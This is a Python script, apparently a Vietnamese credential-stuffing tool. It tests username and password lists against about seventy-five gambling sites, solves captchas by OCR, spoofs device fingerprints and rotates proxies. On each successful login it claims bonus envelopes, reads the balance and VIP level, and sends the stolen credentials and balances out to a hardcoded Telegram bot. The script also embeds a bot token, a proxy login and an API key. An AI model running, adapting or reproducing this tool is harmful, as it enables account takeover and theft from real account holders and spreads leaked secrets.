import os
os.environ["OMP_NUM_THREADS"] = "1"
os.environ["MKL_NUM_THREADS"] = "1"
os.environ["OPENBLAS_NUM_THREADS"] = "1"
os.environ["VECLIB_MAXIMUM_THREADS"] = "1"
os.environ["NUMEXPR_NUM_THREADS"] = "1"

import sys
import time
import uuid
import base64
import random
import hashlib
import secrets
import threading
import re
from queue import Queue
from typing import Optional, Dict, Any, List, Tuple
from email.utils import parsedate_to_datetime
import requests

# ── Dependencies ──────────────────────────────────────────
try:
    from curl_cffi import requests as cffi_requests
    import ddddocr
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    import PIL.Image
    if not hasattr(PIL.Image, "ANTIALIAS"):
        PIL.Image.ANTIALIAS = PIL.Image.LANCZOS
    import numpy as np
    import cv2
except ImportError:
    print("❌ Thiếu thư viện. Vui lòng chạy: pip install curl_cffi ddddocr pycryptodome pillow numpy opencv-python requests")
    sys.exit(1)

# ============ CONFIG ============
DOMAINS = [
    "m.nohu90.com", "m.ok36533.vip", "m.0qs88.com", "m.00dn88.com", "m.f8bbet.com",
    "m.pg99ok.vip", "m.0mmoo.com", "m.hi88xx.com", "m.shbetv3.com",
    "m.qq4422.com", "m.mm6799.com", "m.rr8891.com", "m.1xx88.com", "m.fly88h.com", "m.sc88.com",
    "m.c168.com", "m.f168m.com", "m.5uy88.com", "m.98tt88.com", "m.78978966.com", "m.97777999.com",
    "m.new88pc.com", "m.mb66a3.com", "m.79king1.com", "m.j866.ink", "m.u8886.cyou", "m.88ck.xyz",
    "m.abc11.ink", "m.8k4028q.top", "m.win55mm.com", "m.CN3789.NET", "m.007win.bet", "m.16vvvwin.com",
    "m.18win.com", "m.1bmw.me", "m.26hello88.com", "m.vip32win.club", "m.336049.com", "m.4vipwin.com",
    "m.5ivug.fun", "m.69vn5.com", "m.789bettg.net", "m.789win0052.com", "m.796621.com", "m.799568.win",
    "m.79k09.club", "m.82king88.com", "m.88ok7.net", "m.88vv.my", "m.89bet3000.com", "m.8k0341q.top",
    "m.98wn65.com", "m.cwin05.com", "m.dpyg3.xyz", "m.f8betv9.net", "m.good8815.cc", "m.hi2999.com",
    "m.hkt699e.vip", "m.hubet59.com", "m.i9bet41.com", "m.kl991.com", "m.kuwn42.com", "m.mb6614.run",
    "m.new886.ec", "m.new888e.vip", "m.ok559.cc", "m.okking72.com", "m.okvnd.my", "m.pg66.com",
    "m.shbetaa1.kim", "m.tt88.com", "m.win55mmm.com", "m.xin88.xin"
]

NUM_THREADS = 16  # Giảm số luồng xuống để tiết kiệm RAM tối đa (tránh tràn RAM)
PROGRESS_EVERY = 50

# ============ TELEGRAM ============
DEFAULT_TG_TOKEN = '8974102288:AAE3h0xrHuXQPIrddcRTQaqq4Jg9_pVGmQ0'
DEFAULT_TG_CHAT_ID = '7348217229'

# ============ SINGLETON OCR (Tiết kiệm RAM tối đa) ============
_ocr_instance = None
_ocr_lock = threading.Lock()

def get_ocr():
    global _ocr_instance
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

# ============ LOAD ACCOUNTS ============
def load_accounts() -> list:
    users = []
    if not os.path.exists("100.txt"):
        return users
    try:
        with open("100.txt", "r", encoding="utf-8-sig", errors="ignore") as f:
            seen = set()
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                parts = line.split("|") if "|" in line else (line.split(":") if ":" in line else [line])
                u = parts[0].strip()
                p = parts[1].strip() if len(parts) >= 2 else u
                if u and u not in seen:
                    seen.add(u)
                    users.append({"user": u, "pw": p})
    except:
        pass
    return users

print_lock = threading.Lock()
_counter_lock = threading.Lock()
_done_count = 0
_ok_count = 0
_skip_count = 0
TIME_OFFSET: float = 0.0
proxy_provider = None
output_queue = Queue()

class Col:
    GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"
    CYAN = "\033[96m"; GOLD = "\033[33;1m"; MAGENTA = "\033[95m"; RESET = "\033[0m"

def log_safe(msg, color=Col.RESET):
    with print_lock:
        print(f"{color}{msg}{Col.RESET}")

def send_telegram(site: str, user: str, balance: str, vip: str, lixi: str, is_big_win: bool, is_high_vip: bool):
    if is_big_win or is_high_vip:
        text = (
            f"🚨 🔥 <b>[HÀNG KHỦNG]</b> 🔥 🚨\n"
            f"🪐 <b>Web:</b> <code>https://{site}</code>\n"
            f"👤 <b>User:</b> <code>{user}</code>\n"
            f"💰 <b>Bal:</b> <b><u>{balance}</u></b> 💥\n"
            f"🎖️ <b>VIP:</b> <b>⭐ {vip} ⭐</b>\n"
            f"🧧 <b>Lì xì:</b> <code>{lixi}</code>"
        )
    else:
        text = (
            f"✨ <b>SAO PHAI XOAN</b> ✨\n"
            f"🪐 <b>Web:</b> <code>https://{site}</code>\n"
            f"👤 <b>User:</b> <code>{user}</code>\n"
            f"💰 <b>Bal:</b> <code>{balance}</code> | 🎖️ <b>VIP:</b> <code>{vip}</code>"
        )
    try:
        url_send = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/sendMessage"
        payload = {
            "chat_id": DEFAULT_TG_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }
        resp = requests.post(url_send, json=payload, timeout=10)
        res_data = resp.json()

        if (is_big_win or is_high_vip) and res_data.get("ok"):
            message_id = res_data["result"]["message_id"]
            url_pin = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/pinChatMessage"
            pin_payload = {
                "chat_id": DEFAULT_TG_CHAT_ID,
                "message_id": message_id,
                "disable_notification": False
            }
            requests.post(url_pin, json=pin_payload, timeout=10)
    except:
        pass

class AntiDetect:
    _DEVICES = [
        ("Samsung", "SM-S931B", "15", (412, 915), "Samsung Xclipse 940"),
        ("Samsung", "SM-S928B", "14", (384, 832), "Qualcomm Adreno (TM) 750"),
    ]
    @classmethod
    def generate(cls) -> Dict[str, Any]:
        brand, model, android_ver, screen, gpu = random.choice(cls._DEVICES)
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36"
        return {
            "ua": ua, "sec_ch_ua": '"Not/A)Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
            "device_fp": hashlib.md5(secrets.token_hex(16).encode()).hexdigest(),
            "tls_profile": "chrome120"
        }

PUB_KEY = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCKcWX+rK229Li2zXDtB5KJOESv
RrCTNiUIwZ/Iljkfm9lSnt22N8Iqzv/h8O1+xTMqlORSJM1Xq3tRtRIUNMJMTEv8
oqUOJesJFPE+V0agCQ5COhKrUkTqjJ71izDUGJokeCIL4zSV1y7ZJI1PKcP+BH5o
NM6BVGhApPFQeDrI/QIDAQAB
-----END PUBLIC KEY-----"""

def make_sec_headers(domain: str, ua: str) -> Dict[str, str]:
    ts = str(int((time.time() + TIME_OFFSET) * 1000))
    nonce = str(uuid.uuid4())
    data = f"{ts}:{nonce}:{domain}:{ua}".encode("utf-8")
    key = RSA.import_key(PUB_KEY)
    ciph = PKCS1_v1_5.new(key)
    enc = b"".join(ciph.encrypt(data[i:i+117]) for i in range(0, len(data), 117))
    return {"x-nonce": nonce, "x-timestamp": ts, "x-sec-data": base64.b64encode(enc).decode()}

def solve_captcha(img_b64: str) -> Optional[str]:
    try:
        if "," in img_b64: img_b64 = img_b64.split(",")[1]
        img_bytes = base64.b64decode(img_b64)
        img_np = cv2.imdecode(np.frombuffer(img_bytes, dtype=np.uint8), cv2.IMREAD_GRAYSCALE)
        if img_np is None: return None
        _, img_np = cv2.threshold(img_np, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, clean = cv2.imencode(".png", img_np)
        
        ocr = get_ocr()
        res = ocr.classification(clean.tobytes(), png_fix=True)
        if not res: res = ocr.classification(img_bytes)
        if not res: return None
        res = res.strip().upper().replace(" ", "")
        res = res.replace("O", "0").replace("L", "1").replace("I", "1").replace("S", "5").replace("B", "8")
        return re.sub(r'[^A-Z0-9]', '', res) if len(res) >= 3 else None
    except:
        return None

class SiteAPI:
    def __init__(self, domain: str, proxy: Optional[str] = None):
        self.domain = domain
        self.profile = AntiDetect.generate()
        self.ua = self.profile["ua"]
        self.fp = self.profile["device_fp"]
        self.token = None
        self.session = cffi_requests.Session(impersonate=self.profile["tls_profile"])
        if proxy:
            p = proxy if "://" in proxy else f"http://{proxy}"
            self.session.proxies = {"http": p, "https": p}
        self.session.headers.update({
            "user-agent": self.ua, "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*", "sec-ch-ua": self.profile["sec_ch_ua"],
            "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"', "x-requested-with": "XMLHttpRequest",
            "referer": f"https://{domain}/Account/Login?app=1", "origin": f"https://{domain}", "content-language": "vi-VN"
        })

    def _sec(self) -> Dict[str, str]:
        return make_sec_headers(self.domain, self.ua)

    def login(self, user: str, pw: str, code: str, enc_val: str) -> str:
        url = f"https://{self.domain}/api/0.0/login/login?app=1"
        body = {"account": user, "password": pw, "checkCode": code, "checkCodeEncrypt": enc_val, "fingerprint": self.fp, "usedApp": False}
        try:
            r = self.session.post(url, json=body, headers=self._sec(), timeout=15)
            res = r.json()
            if res.get("Code") == 200 or res.get("IsSuccess") is True:
                login_token = res.get("LoginToken")
                if login_token and isinstance(login_token, dict):
                    self.token = login_token.get("AccessToken")
                    if self.token:
                        self.session.headers["authorization"] = f"Bearer {self.token}"
                        return "SUCCESS"
            msg = (res.get("Message") or res.get("ErrorMessage") or "").lower()
            return "WRONG_PASS" if ("sai" in msg or "không đúng" in msg) else "FAIL"
        except:
            return "ERROR"

    def get_balance(self) -> Tuple[str, str]:
        for url in [f"https://{self.domain}/api/0.0/Home/get-balance/?app=1", f"https://{self.domain}/api/1.0/user/info?app=1"]:
            try:
                r = self.session.get(url, headers=self._sec(), timeout=10)
                res = r.json()
                if res.get("Code") == 200 or res.get("IsSuccess") is True:
                    data = res.get("ReturnObject") or res.get("Data") or res.get("Result") or res or {}
                    if isinstance(data, list): data = data[0] if data else {}
                    balance = data.get("Money") or data.get("money") or data.get("Balance") or data.get("balance") or "0"
                    return str(balance), "0"
            except:
                continue
        return "0", "0"

    def get_vip_info(self) -> str:
        url = f"https://{self.domain}/api/1.0/member/vip/experience?app=1"
        try:
            r = self.session.get(url, headers=self._sec(), timeout=10)
            res = r.json()
            data_obj = res.get("ReturnObject") or res.get("Data") or res.get("Result") or res or {}
            if isinstance(data_obj, list) and len(data_obj) > 0: data_obj = data_obj[0]
            if isinstance(data_obj, dict):
                for key in ["Grade", "grade"]:
                    if key in data_obj and data_obj[key] is not None:
                        return str(data_obj[key])
        except:
            pass
        return "0"

    def get_captcha_login(self) -> Optional[Dict]:
        try:
            r = self.session.post(f"https://{self.domain}/api/0.0/Home/GetCaptchaForLogin", headers=self._sec(), timeout=10)
            return r.json()
        except:
            return None

    def check_and_claim_lixi(self) -> List[Dict[str, Any]]:
        claimed = []
        try:
            r = self.session.post(f"https://{self.domain}/api/0.0/RedEnvelope/GetRedEnvelopListNew", json={}, headers=self._sec(), timeout=10)
            res = r.json()
            data = res.get("ReturnObject") or res.get("Data") or res.get("Result") or []
            if isinstance(data, list):
                for item in data:
                    if not isinstance(item, dict): continue
                    env_id = item.get("id") or item.get("Id") or item.get("envelopeId")
                    if env_id:
                        try:
                            r_claim = self.session.post(f"https://{self.domain}/api/1.0/redEnvelope/received", json={"id": int(env_id)}, headers=self._sec(), timeout=10)
                            res_claim = r_claim.json()
                            msg = res_claim.get("Message") or res_claim.get("ErrorMessage") or "Thành công"
                            claimed.append({"id": env_id, "ok": True, "msg": msg})
                        except:
                            claimed.append({"id": env_id, "ok": False, "msg": "Lỗi"})
        except:
            pass
        return claimed

class ProxyProvider:
    def __init__(self, rotate_interval=60):
        self.api_key = "df74574b8d6bff687ed1ca392b19f653"
        self.raw_proxy = "202.55.133.231:36817:ngww1:9e8mc"
        self.proxy = self._format_proxy(self.raw_proxy)
        self.lock = threading.Lock()
        self.rotate_interval = rotate_interval
        
        self.running = True
        self.rotator_thread = threading.Thread(target=self._auto_rotate_loop, daemon=True)
        self.rotator_thread.start()

    def _format_proxy(self, proxy_str):
        parts = proxy_str.split(":")
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return f"http://{user}:{pwd}@{ip}:{port}"
        return f"http://{proxy_str}"

    def rotate_ip(self):
        try:
            headers = {"Authorization": f"Bearer {self.api_key}"}
            requests.get(f"https://api.allproxy.vn/v1/change-ip?api_key={self.api_key}", timeout=10)
            log_safe(f"[*] Đã kích hoạt đổi IP AllProxy mới tự động!", Col.CYAN)
        except Exception as e:
            pass

    def _auto_rotate_loop(self):
        while self.running:
            time.sleep(self.rotate_interval)
            with self.lock:
                self.rotate_ip()

    def get_proxy(self):
        with self.lock:
            return self.proxy

def get_output_filename(domain: str) -> str:
    name = domain[2:] if domain.startswith("m.") else domain
    parts = name.split(".")
    return f"{parts[0]}.txt" if parts else f"{domain}.txt"

def parse_balance(bal_str: str) -> float:
    try: return float(str(bal_str).replace(',', '').strip())
    except: return 0.0

def file_writer_worker():
    while True:
        item = output_queue.get()
        if item is None:
            output_queue.task_done()
            break
        file_path, new_line = item
        lines = []
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                for line in f:
                    if line.strip(): lines.append(line.strip())
        new_line_str = new_line.strip()
        if new_line_str not in lines:
            lines.append(new_line_str)
        lines.sort(key=lambda l: parse_balance(l.split("|")[2]) if len(l.split("|")) >= 3 else 0.0, reverse=True)
        with open(file_path, "w", encoding="utf-8") as f:
            for l in lines: f.write(l + "\n")
        output_queue.task_done()

def check_one_account(idx, total, acc, domain, proxy_url):
    global _done_count, _ok_count, _skip_count
    api = SiteAPI(domain, proxy_url)
    logged_in = False
    for attempt in range(3):
        cap_data = api.get_captcha_login()
        if not cap_data or not cap_data.get('image'):
            continue
        code = solve_captcha(cap_data['image'])
        if not code: continue
        res = api.login(acc['user'], acc['pw'], code, cap_data.get('value'))
        if res == "SUCCESS":
            logged_in = True
            break
        elif res == "WRONG_PASS":
            break

    if logged_in:
        claimed_lixi = api.check_and_claim_lixi()
        balance, _ = api.get_balance()
        vip = api.get_vip_info()
        bal_num = parse_balance(balance)

        is_big_win = bal_num > 10
        try: vip_num = int(vip)
        except: vip_num = 0
        is_high_vip = vip_num >= 5

        lixi_tg_str = ", ".join([f"ID {l['id']}: {l['msg']}" for l in claimed_lixi]) if claimed_lixi else "Không có"

        status_color = Col.GOLD if (is_big_win or is_high_vip) else Col.GREEN
        log_safe(f"[{idx}/{total}] {domain} | {acc['user']} | Bal: {balance} | VIP: {vip}", status_color)

        send_telegram(domain, acc['user'], balance, f"VIP {vip}", lixi_tg_str, is_big_win, is_high_vip)

        domain_clean = get_output_filename(domain).replace(".txt", "")
        line = f"{acc['user']}|{acc['pw']}|{balance}|{vip}"
        line_with_domain = f"{acc['user']}|{acc['pw']}|{balance}|{vip}|{domain}"

        output_queue.put((f"{domain_clean}.txt", line))
        output_queue.put(("f98win.txt", line_with_domain))
        if is_big_win:
            output_queue.put(("big_accounts.txt", line_with_domain))

    with _counter_lock:
        _done_count += 1
        if logged_in: _ok_count += 1
        else: _skip_count += 1
        done, ok, skip = _done_count, _ok_count, _skip_count
    if done % PROGRESS_EVERY == 0 or done == total:
        log_safe(f"[TIẾN ĐỘ] Hoàn thành: {done}/{total} | Thành công: {ok} | Lỗi: {skip}", Col.CYAN)

def main():
    log_safe(f"🚀 KHỞI ĐỘNG HỆ THỐNG QUÉT TÀI KHOẢN (TỐI ƯU GIẢM RAM)", Col.GOLD)
    
    accounts = load_accounts()
    log_safe(f"[*] Đã tải thành công {len(accounts)} tài khoản từ file 100.txt.", Col.CYAN)
    if not accounts:
        log_safe("❌ Không tìm thấy danh sách tài khoản hợp lệ trong file 100.txt.", Col.RED)
        return
        
    global proxy_provider
    proxy_provider = ProxyProvider(rotate_interval=60)
    
    writer_thread = threading.Thread(target=file_writer_worker, daemon=True)
    writer_thread.start()
    
    task_queue = Queue()
    total_tasks = len(accounts) * len(DOMAINS)
    task_idx = 1
    for a in accounts:
        for domain in DOMAINS:
            task_queue.put((task_idx, a, domain))
            task_idx += 1
            
    def worker():
        while True:
            try:
                idx, acc, domain = task_queue.get_nowait()
                check_one_account(idx, total_tasks, acc, domain, proxy_provider.get_proxy())
            except:
                break
            finally:
                task_queue.task_done()
                
    threads = []
    log_safe(f"[*] Đang thực thi quét qua {len(DOMAINS)} domains với {NUM_THREADS} threads...", Col.CYAN)
   
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
        
    proxy_provider.running = False
    output_queue.put(None)
    output_queue.join()
    writer_thread.join()
    log_safe("✅ QUÁ TRÌNH QUÉT ĐÃ HOÀN TẤT TOÀN BỘ!", Col.GREEN)

if __name__ == "__main__":
    if sys.platform == "win32": os.system("")
    if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
    main()
